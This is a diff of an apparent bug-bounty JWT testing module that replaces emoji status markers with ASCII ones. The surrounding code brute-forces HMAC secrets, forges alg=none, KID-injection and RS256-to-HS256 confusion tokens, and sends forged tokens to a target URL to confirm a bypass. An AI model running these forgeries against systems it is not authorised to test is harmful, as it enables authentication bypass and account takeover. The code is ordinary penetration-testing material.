@@ -53,19 +53,19 @@ async def bb_jwt_decode(token: str) -> str:
         result.append("[安全检查]")
         alg = header.get("alg", "").lower()
         if alg == "none":
-            result.append("  ⚠️ alg=none — 存在 None 签名攻击风险！")
+            result.append("  [!] alg=none — 存在 None 签名攻击风险！")
         if "kid" in header:
             kid = header["kid"]
             if any(c in kid for c in ["../", "..\\", "/etc/", "file://"]):
-                result.append("  ⚠️ KID 包含路径遍历字符 — 存在 KID 注入风险！")
+                result.append("  [!] KID 包含路径遍历字符 — 存在 KID 注入风险！")
             if kid in ("", "null", "0", "1", "true"):
-                result.append("  ⚠️ KID 值可疑 — 可能存在注入风险")
+                result.append("  [!] KID 值可疑 — 可能存在注入风险")
         if payload.get("iat", 0) and payload.get("exp", 0):
             exp = payload["exp"]
             iat = payload["iat"]
             duration = exp - iat
             if duration > 86400 * 30:
-                result.append(f"  ⚠️ Token 过期时间异常（{duration//86400} 天）")
+                result.append(f"  [!] Token 过期时间异常（{duration//86400} 天）")
 
         return "\n".join(result)
     except Exception as e:
@@ -107,24 +107,24 @@ async def bb_jwt_analyze(token: str) -> str:
     vulns = []
 
     if alg == "none":
-        vulns.append(("🔥 HIGH", "None 签名攻击", "alg=none，可绕过签名验证伪造任意 Token"))
+        vulns.append(("[!] HIGH", "None 签名攻击", "alg=none，可绕过签名验证伪造任意 Token"))
     if alg == "hs256":
-        vulns.append(("⚠️ MEDIUM", "弱密钥爆破", "HS256 对称算法，可尝试爆破密钥"))
+        vulns.append(("[!] MEDIUM", "弱密钥爆破", "HS256 对称算法，可尝试爆破密钥"))
     if alg in ("rs256", "rs384", "rs512") and "kid" in header:
-        vulns.append(("⚠️ MEDIUM", "算法混淆可能", "RS256 + KID，尝试将 RS256 降级为 HS256"))
+        vulns.append(("[!] MEDIUM", "算法混淆可能", "RS256 + KID，尝试将 RS256 降级为 HS256"))
     if "kid" in header:
         kid = header["kid"]
         if "../" in kid or "..\\" in kid:
-            vulns.append(("🔥 HIGH", "KID 路径遍历", f"KID 包含 '../'，可读取任意文件"))
+            vulns.append(("[!] HIGH", "KID 路径遍历", f"KID 包含 '../'，可读取任意文件"))
         if kid == "" or kid.lower() == "none":
-            vulns.append(("⚠️ MEDIUM", "KID 值空", "KID 为空，可能存在注入"))
+            vulns.append(("[!] MEDIUM", "KID 值空", "KID 为空，可能存在注入"))
     if "exp" not in payload:
-        vulns.append(("⚠️ MEDIUM", "无过期时间", "Token 永不过期"))
+        vulns.append(("[!] MEDIUM", "无过期时间", "Token 永不过期"))
     if "jti" not in payload:
-        vulns.append(("ℹ️ LOW", "无 JWT ID", "缺少 jti 防重放"))
+        vulns.append(("[i] LOW", "无 JWT ID", "缺少 jti 防重放"))
 
     if not vulns:
-        result.append("  ✅ 未发现明显安全问题")
+        result.append("  [+] 未发现明显安全问题")
     else:
         for severity, name, desc in vulns:
             result.append(f"  {severity} {name}")
@@ -133,12 +133,12 @@ async def bb_jwt_analyze(token: str) -> str:
     result.append("")
     result.append("[攻击建议]")
     if "hs" in alg:
-        result.append("  🔹 尝试暴力破解密钥: bb_jwt_crack(token=..., wordlist=[...])")
+        result.append("  - 尝试暴力破解密钥: bb_jwt_crack(token=..., wordlist=[...])")
     if "rs" in alg:
-        result.append("  🔹 尝试算法混淆: bb_jwt_attack(token=..., pubkey=...)")
-    result.append("  🔹 尝试 None 签名: bb_jwt_attack(token=..., mode='none')")
+        result.append("  - 尝试算法混淆: bb_jwt_attack(token=..., pubkey=...)")
+    result.append("  - 尝试 None 签名: bb_jwt_attack(token=..., mode='none')")
     if "kid" in header:
-        result.append("  🔹 尝试 KID 注入: bb_jwt_attack(token=..., mode='kid')")
+        result.append("  - 尝试 KID 注入: bb_jwt_attack(token=..., mode='kid')")
 
     return "\n".join(result)
 
@@ -230,7 +230,7 @@ async def bb_jwt_crack(
         for secret in words:
             try:
                 decoded = jwt.decode(token, key=secret, algorithms=[alg])
-                result.append(f"[✓] 找到密钥: {secret}")
+                result.append(f"[+] 找到密钥: {secret}")
                 for k, v in decoded.items():
                     result.append(f"    {k}: {v}")
                 return "\n".join(result)
@@ -288,7 +288,7 @@ async def bb_jwt_attack(
         if mode == "none":
             # None 签名攻击
             forged = jwt.encode(new_payload, key="", algorithm="none")
-            result.append("[✓] None 签名 Token 生成成功:")
+            result.append("[+] None 签名 Token 生成成功:")
             result.append(f"  {forged}")
             result.append("")
             # 自动验证
@@ -300,9 +300,9 @@ async def bb_jwt_attack(
                     client = HttpClient(timeout=10)
                     resp = await client.get(verify_url, headers={"Authorization": f"Bearer {forged}"})
                     if resp.status_code == 200:
-                        result.append(f"    [🔥 绕过成功] HTTP {resp.status_code} — 服务器接受了伪造 Token！")
+                        result.append(f"    [!] 绕过成功] HTTP {resp.status_code} — 服务器接受了伪造 Token！")
                     elif resp.status_code in (401, 403):
-                        result.append(f"    [✗ 绕过失败] HTTP {resp.status_code} — 服务器拒绝了伪造 Token")
+                        result.append(f"    [-] 绕过失败] HTTP {resp.status_code} — 服务器拒绝了伪造 Token")
                     else:
                         result.append(f"    [?] HTTP {resp.status_code} — 需要人工分析")
                 except Exception as ve:
@@ -321,7 +321,7 @@ async def bb_jwt_attack(
                 algorithm=forged_header.get("alg", "HS256"),
                 headers=forged_header,
             )
-            result.append("[✓] KID 注入 Token:")
+            result.append("[+] KID 注入 Token:")
             result.append(f"  {forged}")
             result.append("")
             result.append("[!] 如果服务器使用 KID 值作为密钥文件路径")
@@ -337,17 +337,17 @@ async def bb_jwt_attack(
                     key=public_key,
                     algorithm="HS256",
                 )
-                result.append("[✓] 算法混淆攻击 Token (RS256 → HS256):")
+                result.append("[+] 算法混淆攻击 Token (RS256 → HS256):")
                 result.append(f"  {forged}")
                 result.append("")
                 result.append("[!] 如果服务端使用公钥验证 HS256 签名，此 Token 会被接受")
             except Exception as e:
-                result.append(f"[✗] 签名失败: {e}")
+                result.append(f"[-] 签名失败: {e}")
 
         else:
             return f"[!] 未知攻击模式: {mode}（可选: none / kid / algorithm_confusion）"
 
     except Exception as e:
-        result.append(f"[✗] 攻击失败: {e}")
+        result.append(f"[-] 攻击失败: {e}")
 
     return "\n".join(result)
